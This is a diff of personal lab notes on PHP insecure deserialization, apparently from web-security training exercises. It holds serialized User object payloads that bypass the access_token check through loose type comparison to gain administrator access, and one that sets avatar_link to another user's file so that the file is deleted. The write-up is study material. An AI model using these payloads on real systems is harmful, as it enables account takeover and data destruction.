@@ -87,3 +87,7 @@ PHP Fatal error:  Uncaught Exception: (DEBUG: $access_tokens[$user-&gt;username]
 ```
 - My first attempt at exploiting this failed because I attempted an integer substitution of the access_token `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:1;}` but this wasn't working - why? Well, it's probably because the access token begins with an integer! So `i:1` failed for me because 1 == DOES NOT whatever integer the access token starts with.
 - Okay, well since we don't want to play guess the integer, how about we use booleans? Remember `true` equals any string that is not empty so `true == "abc123"` or `true == "123abc"`. Let's do `O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`.
+
+#### Lab: Using Application Functionality to Exploit Insecure Deserialization
+* Session cookie is this: `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:19:"users/wiener/avatar";}`
+* Initial payload was `O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kmihavx4auvkl1t5yputq7n241ff75ln";s:11:"avatar_link";s:23:"users/carlos/morale.txt";}` which did not work ...
